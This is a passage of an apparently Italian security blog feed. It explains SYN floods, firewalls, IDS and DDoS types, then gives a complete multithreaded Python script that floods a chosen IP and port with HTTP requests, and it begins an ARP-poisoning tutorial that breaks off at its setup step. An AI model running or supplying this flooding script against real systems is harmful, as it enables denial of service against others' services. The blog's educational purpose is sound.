&lt;p&gt;Questo attacco mira a saturare le risorse della macchina, basandosi su una peculiarità del protocollo TCP, il quale, ogni qualvolta viene aperta una connessione TCP esegue un three way handshake. L’attaccante non esegue di fatto il three way ma invia solo il primo pacchetto SYN, lasciando uno stato aperto (una struttura di memoria fondamentalmente) sul server.&lt;/p&gt;
&lt;p&gt;Una volta che sul server sono presenti migliaia di connessioni aperte per metà, la memoria andrà ad esaurirsi e l’attacco sarà andato a buon fine. Per risolvere questo attacco basta utilizzare un SYN Cookie, cioè si crea la struttura dati solo quando l’handshake è completato. In questo modo non possono essere create strutture a metà ma solo complete, quindi ragionevolmente, solamente da parte di host innocui:&lt;/p&gt;
&lt;h2 id=&#34;come-difender&#34;&gt;Come difender?&lt;/h2&gt;
&lt;p&gt;Le difese a questa tipologia di attacchi sono ormai molte (ricordiamoci che parliamo di attacchi da un singolo host, principalmente con IP statico) e ben testate.&lt;/p&gt;
&lt;h3 id=&#34;firewall&#34;&gt;Firewall&lt;/h3&gt;
&lt;p&gt;I firewall sono device di sicurezza che permettono di controllare il traffico tra le due parti di una rete. Tutto il traffico deve passare quindi attraverso il firewall per essere protetto. Ci sono due tipi di firewall:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;packet filter: lavorano a livello OSI 3 e 4 e ispezionano l’header dei pacchetti IP, oltre alla porta TCP e UDP. Vengono specificate delle regole per le quali certi pacchetti possono o non possono passare, in entrambe le direzioni. I pacchetti possono quindi essere bloccati in base all’indirizzo IP di sorgente o destinazione o la porta TPC/UDP di sorgente o destinazione.&lt;/li&gt;
&lt;li&gt;stateful packet filter: analizzano il pacchetto, comprendendo le richieste e le risposte (SYN,SYN-ACK, ACK).&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;ids&#34;&gt;IDS&lt;/h3&gt;
&lt;p&gt;Gli IDS consistono in una serie di sensori che rilevano dati, e possono essere posizionati sia sugli hosts che sulla rete. Ci sono due approcci alla rilevazione di intrusione:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;basato sulla conoscenza: cercano pattern di traffico o attività che sembrano maligne sulla base di informazioni come login falliti, pattern di bit che indicano un attacco di buffer overflow, certi tipi di pacchetti TCP SYN che indicano un attacco SYN flood. Vengono anche detti misuse detection IDS.&lt;/li&gt;
&lt;li&gt;basato sul comportamento: rilevano anomalie nel sistema, in base alle statistiche di utilizzo (e.g. se di notte non c’è traffico, se c’è è un male)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Gli IDS sono quindi sensori distribuiti atti a raccogliere dati, analizzare, riportare le informazioni utili e nel caso reagire. Idealmente:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;proteggono le comunicazioni;&lt;/li&gt;
&lt;li&gt;proteggono I dati;&lt;/li&gt;
&lt;li&gt;possono essere attaccati e manipolati.
Essi si possono dividere in:&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Network Based IDS (NIDS) guardano gli attacchi nel traffico di rete&lt;/strong&gt;: essi utilizzano I pacchetti di rete come sorgente e sono tipicamente degli adattatori i rete in modalità promiscua. Riconoscono gli attacchi sulla base di:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;pattern o espressioni;&lt;/li&gt;
&lt;li&gt;frequenza di rilevazione (es port scanning);&lt;/li&gt;
&lt;li&gt;correlazione di eventi poco frequenti.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Host-based IDS (HIDS) guardano gli attacchi negli host&lt;/strong&gt;: tipicamente sono sistemi di monitoraggio eventi e log di sicurezza. Verificare il checksum dei file di sistema e eseguibili. Alcuni prodotti ascoltano l’attività delle porte e avvisano se ci sono accessi.&lt;/p&gt;
&lt;p&gt;I semplici attacchi DoS sono ormai in disuso, in quanto decisamente meno performanti rispetto ad un attacco di negazione del servizio distribuito.&lt;/p&gt;
&lt;p&gt;Ora che abbiamo dato una panoramica generiale comprendiamo cos&amp;rsquo;è un attacco DDoS.&lt;/p&gt;
&lt;h1 id=&#34;cosè-un-attacco-denial-of-service&#34;&gt;Cos&amp;rsquo;è un Attacco Denial of Service&lt;/h1&gt;
&lt;p&gt;Un attacco di tipo Distributed Denial of Service (DDoS) è un&amp;rsquo;arma di sicurezza informatica che mira a interrompere le attività aziendali o estorcere denaro alle organizzazioni prese di mira. Le motivazioni di questi attacchi possono essere legate a ragioni di carattere politico, religioso, competitivo o di profitto finanziario. Un attacco DDoS è tecnicamente la versione distribuita del Denial of Service (DoS), che ha lo scopo di interrompere i servizi di un’azienda. I malintenzionati utilizzano enormi volumi di traffico per sovraccaricare i normali carichi di lavoro, server o interconnessioni di rete per renderli inutilizzabili. Se l’effetto degli attacchi DoS è quello di interrompere un servizio, gli attacchi distribuiti (DDoS) vengono invece eseguiti su scala molto più estesa, con il conseguente arresto di intere infrastrutture e servizi scalabili (servizi Cloud).&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Nell&amp;rsquo;agosto 2020, la Borsa neozelandese è stata vittima di un attacco DDoS volumetrico che ha interrotto il servizio per tre giorni consecutivi causando la perdita di milioni di dollari.&lt;/li&gt;
&lt;li&gt;Nel febbraio 2020, un hyperscaler globale ha segnalato un attacco alla propria infrastruttura con 2,3 Tbps di traffico malevolo e 20,6 milioni di richieste al secondo.&lt;/li&gt;
&lt;li&gt;Nei mesi di febbraio e marzo 2018, diverse aziende hanno segnalato un nuovo vettore di attacco basato su una vulnerabilità di memcached che utilizzava tecniche di amplificazione e riflessione. OVHcloud ha osservato e filtrato attacchi con dimensioni fino a 1,3 Tbps.&lt;/li&gt;
&lt;li&gt;Nell&amp;rsquo;ottobre 2016, un attacco informatico di tipo Dyn DDoS ha causato l&amp;rsquo;interruzione dei principali servizi Internet con una serie di attacchi DDoS mirati a sistemi gestiti dal provider DNS Dyn.&lt;/li&gt;
&lt;li&gt;Nel settembre 2016 la botnet Mirai, composta da oltre 600.000 dispositivi IoT compromessi (come le telecamere), è stata utilizzata contro una nota pagina di notizie sulla sicurezza, Krebs on Security. Questo attacco ha colpito la vittima con ben 620 Gbps di traffico durante il suo picco maggiore. Contemporaneamente, OVHcloud ha segnalato un attacco di oltre 1 Tbps.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;tipi-di-attacco-ddos&#34;&gt;Tipi di attacco DDoS&lt;/h2&gt;
&lt;h3 id=&#34;attacchi-volumetrici&#34;&gt;Attacchi volumetrici&lt;/h3&gt;
&lt;p&gt;Gli &lt;strong&gt;attacchi DDoS volumetrici&lt;/strong&gt; sono i più diffusi. L&amp;rsquo;intento di un attacco di questo tipo è quello di rendere server, servizi o infrastrutture irraggiungibili, inondando con enormi quantità di richieste. In questo modo, la connessione di rete o le risorse risultano sature: gli utenti legittimi non riescono ad accedere ai servizi e i server non sono più in grado di gestire i flussi di traffico né di rispondere alle richieste. Le macchine compromesse (o altri dispositivi connessi come IoT e videocamere), chiamati botnet, possono essere utilizzati dagli hacker per rendere un attacco più distribuito e quindi efficace. Una delle tecniche più utilizzate dagli hacker è quella di inviare da un indirizzo IP falsificato (IP spoofing) grandi quantità di pacchetti di piccole dimensioni alle botnet, che a loro volta rispondono con pacchetti più grandi direttamente alla vittima (all&amp;rsquo;IP falsificato). I bersagli colpiti da questa quantità imprevista di traffico solitamente non sono in grado di rispondere alle richieste e le loro connessioni Internet sono completamente congestionate dal traffico dannoso che occupa tutta la banda disponibile. Questa tecnica è chiamata attacco di riflessione e amplificazione.&lt;/p&gt;
&lt;h3 id=&#34;attacchi-ai-protocolli&#34;&gt;Attacchi ai protocolli&lt;/h3&gt;
&lt;p&gt;Questi tipi di attacco colpiscono i protocolli utilizzati per la comunicazione di rete e sfruttano le vulnerabilità per rendere indisponibili i server o i servizi della vittima. Questo scenario in alcuni casi può portare al sovraccarico dei dispositivi che collegano questi servizi a Internet. Un esempio di attacco basato sui protocolli è lo Smurf DDoS, un Denial of Service distribuito a livello di rete. Un pacchetto inviato da un hacker a un indirizzo di rete broadcast genera una risposta automatica da parte di ogni host. Utilizzando questo metodo e falsificando l’IP sorgente (spoofing), gli aggressori possono deviare un gran numero di risposte e sommergere una vittima con il traffico. Con la giusta quantità di risposte ICMP, un bersaglio può essere tenuto offline.&lt;/p&gt;
&lt;h3 id=&#34;attacchi-a-livello-di-applicazione-l7&#34;&gt;Attacchi a livello di applicazione (L7)&lt;/h3&gt;
&lt;p&gt;Le applicazioni implementano la logica più avanzata e sono generalmente quelle che utilizzano una quantità maggiore di risorse, le più specifiche e probabilmente le meno testate. Queste caratteristiche le rendono un bersaglio perfetto per un attacco. I metodi di attacco sferrati a questo livello di solito richiedono una minima quantità di risorse e, per la maggior parte, possono passare inosservati ai firewall e ai sistemi di protezione DoS generali. Un esempio è un attacco a un server game (come i server Minecraft) che rende un gioco inaffidabile, con molte intermittenze, giocatori che perdono la connessione o causano anche downtime. Questo rende i server game inutilizzabili, quindi la piattaforma perde il suo rank e l&amp;rsquo;immagine del proprietario ne risulta danneggiata, con la conseguente perdita di giocatori e soldi. Per difendersi al meglio da questi tipi di attacco è necessaria una buona comprensione della logica delle applicazioni e dei suoi utilizzi specifici.&lt;/p&gt;
&lt;h1 id=&#34;come-realizzare-uno-script-per-il-ddos&#34;&gt;Come realizzare uno script per il DDoS&lt;/h1&gt;
&lt;p&gt;L&amp;rsquo;implementazione di uno script DDOS in Python è abbastanza semplice.&lt;/p&gt;
&lt;p&gt;Abbiamo solo bisogno di inviare richieste a un host su una porta specifica più e più volte. Questo può essere fatto con i sockets. Per accelerare il processo e renderlo più efficace, utilizzeremo anche il multi-threading. Quindi, saranno necessarie le seguenti librerie:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; socket
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; threading
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ora la prima cosa di cui abbiamo bisogno sono l&amp;rsquo;indirizzo IP del bersaglio, la porta che vogliamo attaccare e il nostro falso indirizzo IP che vogliamo usare. Nota che questo tipo di indirizzo IP &amp;ldquo;falso&amp;rdquo; non nasconde realmente chi sei. Non ti rende anonimo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;target &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;10.0.0.138&amp;#39;&lt;/span&gt;
fake_ip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;182.21.20.32&amp;#39;&lt;/span&gt;
port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Come ho già detto, DDOS è illegale. Quindi fai attenzione al bersaglio che scegli qui. In questo caso, ho scelto l&amp;rsquo;indirizzo IP del mio router di casa. Puoi anche scegliere il tuo server di casa, la tua stampante o forse anche il tuo sito web. Se non conosci il tuo indirizzo IP, puoi utilizzare la riga di comando e eseguire il ping del dominio per ottenerlo. Come indirizzo IP falso ho scelto un indirizzo casuale ma ancora valido. Ultimo ma non meno importante, ho deciso di attaccare la porta 80, che è HTTP. Se vuoi chiudere un servizio specifico, devi sapere su quale porta sta operando. La prossima cosa che dobbiamo fare è implementare l&amp;rsquo;effettiva funzione di attacco.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;attack&lt;/span&gt;():
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
        s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;socket(socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;AF_INET, socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;SOCK_STREAM)
        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect((target, port))
        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendto((&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GET /&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; target &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; HTTP/1.1&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;), (target, port))
        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendto((&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Host: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; fake_ip &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;), (target, port))
        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Questa funzione di attacco è la funzione che verrà eseguita in ciascuno dei nostri singoli thread. Avvia un ciclo infinito, all&amp;rsquo;interno del quale crea un socket, si connette al target e invia una richiesta HTTP più e più volte. Ovviamente, se stai attaccando un&amp;rsquo;altra porta, dovrai anche cambiare il tipo di richiesta che invii.&lt;/p&gt;
&lt;p&gt;Qui puoi vedere che stiamo inserendo il nostro falso indirizzo IP nella richiesta. La richiesta stessa deve essere codificata in byte, in modo che possa essere inviata al server. Alla fine di ogni iterazione, chiudiamo il nostro socket.&lt;/p&gt;
&lt;p&gt;Ora l&amp;rsquo;ultima cosa che dobbiamo fare è eseguire più thread che eseguono questa funzione contemporaneamente. Se eseguissimo semplicemente la funzione, invierebbe molte richieste più e più volte, ma sarebbe sempre solo una dopo l&amp;rsquo;altra. Utilizzando il multithreading, possiamo inviare molte richieste contemporaneamente.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt;):
    thread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; threading&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Thread(target&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;attack)
    thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In questo caso, stiamo avviando 500 thread che eseguiranno la nostra funzione. Certo, puoi giocare con il numero. Forse 30 o 50 sono già sufficienti. Quando ora eseguiamo il nostro script, eseguiremo il DDOS sull&amp;rsquo;obiettivo ma non vedremo nulla. Se vuoi vedere alcune informazioni, puoi stampare gli importi delle richieste già inviate.&lt;/p&gt;
&lt;p&gt;Basta notare che questo rallenterà il tuo attacco.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;attack_num &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;attack&lt;/span&gt;():
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
        s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;socket(socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;AF_INET, socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;SOCK_STREAM)
        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect((target, port))
        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendto((&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GET /&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; target &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; HTTP/1.1&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;), (target, port))
        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendto((&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Host: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; fake_ip &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;), (target, port))
        
        &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; attack_num
        attack_num &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        print(attack_num)
        
        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Abbiamo creato una variabile attack_num che tiene traccia di quante richieste sono già state inviate. Ad ogni iterazione, aumentiamo questo numero e lo stampiamo.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Introduzione All&#39;ARP Poisoning</title>
      <link>https://kobra3390.github.io/SpaceHack/posts/introduzione-arp-poisoning/introduzione_arp_poisoning/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kobra3390.github.io/SpaceHack/posts/introduzione-arp-poisoning/introduzione_arp_poisoning/</guid>
      <description>Table Of Contents:
 Cos&amp;rsquo;è il Protocollo ARP Che cos’è l’ARP Poisoning ARP Poisoning con Scapy e Python Come prevenire L&amp;rsquo;ARP Poisoning con DAI   In questi giorni ho letto Python per Hacker (seconda edizione) e mi sono imbattuto durante la lettura in un argomento molto interessante, ossia l&amp;rsquo;ARP Poisoning.
Ho iniziato dunque a fare delle ricerche e voglio condividere quello che ho trovato con voi.
Cos&amp;rsquo;è il Protocollo ARP Per approfondire l&amp;rsquo;argomento ti consigli di leggere questo.</description>
      <content>&lt;p&gt;&lt;strong&gt;Table Of Contents&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#cos---il-protocollo-arp&#34;&gt;Cos&amp;rsquo;è il Protocollo ARP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#che-cos---l-arp-poisoning&#34;&gt;Che cos’è l’ARP Poisoning&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#arp-poisoning-con-scapy-e-python&#34;&gt;ARP Poisoning con Scapy e Python&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#come-prevenire-l-arp-poisoning-con-dai&#34;&gt;Come prevenire L&amp;rsquo;ARP Poisoning con DAI&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;In questi giorni ho letto &lt;em&gt;Python per Hacker (seconda edizione)&lt;/em&gt; e mi sono imbattuto durante la lettura in un argomento
molto interessante, ossia &lt;strong&gt;l&amp;rsquo;ARP Poisoning&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Ho iniziato dunque a fare delle ricerche e voglio condividere quello che ho trovato con voi.&lt;/p&gt;
&lt;h1 id=&#34;cosè-il-protocollo-arp&#34;&gt;Cos&amp;rsquo;è il Protocollo ARP&lt;/h1&gt;
&lt;p&gt;Per approfondire l&amp;rsquo;argomento ti consigli di leggere &lt;a href=&#34;https://www.ionos.it/digitalguide/server/sicurezza/arp-poisoning-attacchi-dalla-rete-locale/&#34;&gt;questo&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;A differenza di quanto succede su Internet, i dispositivi presenti nella LAN non comunicano direttamente attraverso gli indirizzi IP, al loro posto, per l’indirizzamento nelle reti locali IPv4, vengono utilizzati gli indirizzi fisici dell’hardware, chiamati indirizzi MAC (Media Access Control). Gli indirizzi MAC vengono attribuiti dal rispettivo produttore hardware e sono unici al mondo. Teoricamente gli indirizzi hardware si adatterebbero quindi per consentire un indirizzamento globale, ma nella prassi questa concezione non si può applicare, visto che gli indirizzi IPv4 sono troppo brevi per rappresentare in modo completo gli indirizzi MAC. Nelle reti basate su IPv4, la risoluzione dell’indirizzo tramite ARP è perciò indispensabile.&lt;/p&gt;
&lt;p&gt;Se ora un computer A volesse contattare un computer B nella stessa rete, per ottenere il suo indirizzo IP deve prima di tutto individuare l’indirizzo MAC appropriato. Così entra in azione l’Address Resolution Protocol (ARP), un protocollo di rete che funziona secondo lo schema request-response. Ricercando l’indirizzo MAC giusto, il computer A invia prima di tutto una richiesta broadcast (chiamata richiesta ARP, in inglese “ARP request”) a tutti i dispositivi in rete, questa richiesta comprende all’incirca le seguenti informazioni:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;Un computer con l&amp;rsquo;indirizzo MAC xx-xx-xx-xx-xx-xx e l&amp;rsquo;indirizzo IP yyy.yyy.yyy.yyy vorrebbe prendere contatto con un computer con l&amp;rsquo;indirizzo IP zzz.zzz.zzz.zzz e ha bisogno dell&amp;rsquo;indirizzo MAC giusto.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;La richiesta ARP viene accolta da tutti i computer nella LAN. Ogni computer in rete è collegato a una tabella locale, detta cache ARP, per evitare che prima dell’invio di ogni pacchetto debba venire fatta una richiesta ARP. Qui vengono salvati temporaneamente tutti gli indirizzi MAC conosciuti, comprensivi dell’IP assegnato.&lt;/p&gt;
&lt;p&gt;Tutti i computer nella rete annotano così nella richiesta broadcast la coppia di indirizzo del mittente consegnato. Però ci si aspetta una risposta broadcast solo dal computer B, che invia un’ARP reply comprendente le seguenti informazioni:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;Qui il sistema con l&amp;rsquo;indirizzo IP zzz.zzz.zzz.zzz. L&amp;rsquo;indirizzo MAC ricercato è aa-aa-aa-aa-aa-aa.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Se un’ARP reply giunge al computer A, questo dispone di tutte le informazioni necessarie per inviare i pacchetti al computer B. Perciò la comunicazione attraverso la rete locale non incontra nessun ostacolo.&lt;/p&gt;
&lt;p&gt;Ma cosa succede se non è il computer di destinazione ricercato a rispondere, bensì un altro dispositivo che viene controllato da un hacker con intenti poco onorevoli? In questo caso entra in gioco l’ARP poisoning.&lt;/p&gt;
&lt;p&gt;Ora che abbiamo chiarito il funzionamento del protocollo ARP, possiamo capire come un attaccante può usare le falle del protocollo per i suoi scopi.&lt;/p&gt;
&lt;h1 id=&#34;che-cosè-larp-poisoning&#34;&gt;Che cos’è l’ARP Poisoning&lt;/h1&gt;
&lt;p&gt;Lo schema request-response del protocollo ARP è creato in modo tale che venga accettata e salvata la prima richiesta a un ARP request. Nel campo dell’ARP spoofing, gli hacker cercano perciò di prevenire il reale computer di destinazione, di inviare un pacchetto di risposta con informazioni false e di manipolare così la tabella ARP del computer richiedente, si parla quindi anche di ARP poisoning, perché si intende un “avvelenamento” della cache ARP. Di solito il pacchetto comprende anche l’indirizzo MAC di un dispositivo di rete, controllato dall’hacker. Il sistema della vittima collega così l’IP di uscita con un indirizzo dell’hardware falso e in seguito invia, inosservato, tutti i pacchetti al sistema controllato dall’hacker, che ha così la possibilità di rilevare tutto il traffico dati o di manipolarlo. Per rimanere nascosto, il traffico dati ascoltato viene solitamente inoltrato al sistema di destinazione reale. Un hacker ottiene così con l’inganno lo status di man in the middle. Se i pacchetti intercettati non vengono inoltrati, bensì rifiutati, l’ARP poisoning può comportare un Denial of Service (DoS). Un’altra strategia prevede che la rete venga continuamente bombardata da ARP reply false. La maggior parte dei sistemi ignorano i pacchetti di risposta che non possono attribuire a nessuna richiesta; però questo cambia non appena un computer avvia nella LAN una richiesta ARP e di conseguenza si ha l’intenzione di accettare una risposta.
È quindi una questione di timing, se al mittente arrivi prima la risposta del sistema di destinazione o di uno dei pacchetti falsi.&lt;/p&gt;
&lt;h1 id=&#34;arp-poisoning-con-scapy-e-python&#34;&gt;ARP Poisoning con Scapy e Python&lt;/h1&gt;
&lt;p&gt;Dopo tutta questa prefazione teorica ora dobbiamo mettere le mani in pasta.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;Disclaimer: ⚠️ Quello che starete per vedere è un esempio di attacco informatico che sto svolgendo su sistemi di mia proprietà. Per chi fosse curioso di replicare quanto vede, consigli di farlo su sistemi di suo possesso, usare queste tecniche su sistemi informatici senza autorizzazione è un illecito. ⚠️&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Per questo attacco useremo una macchina Kali (macchina attaccante) e una macchina Pop-os (macchina target - vittima), rispettivamente su macchina virtuale e sul portatile.&lt;/p&gt;
&lt;p&gt;Per prima cosa controlleremo la configurazione di rete su Pop-os, il nostro bersaglio. Usiamo il comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ifconfig &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;interface&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;em&gt;interface&lt;/em&gt; dovrà essere sostituito con il nome dell’interfaccia di rete della macchina vittima, nel mio caso l’interfaccia è wlp61s0, l’output dovrà essere un qualcosa simile a:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;wlp61s0: flags&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;4163&amp;lt;UP,BROADCAST,RUNNING,MULTICAST&amp;gt;  mtu &lt;span style=&#34;color:#ae81ff&#34;&gt;1500&lt;/span&gt;
        inet 192.168.1.22  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::bf57:5b8e:8ef6:fe0b  prefixlen &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;  scopeid 0x20&amp;lt;link&amp;gt;
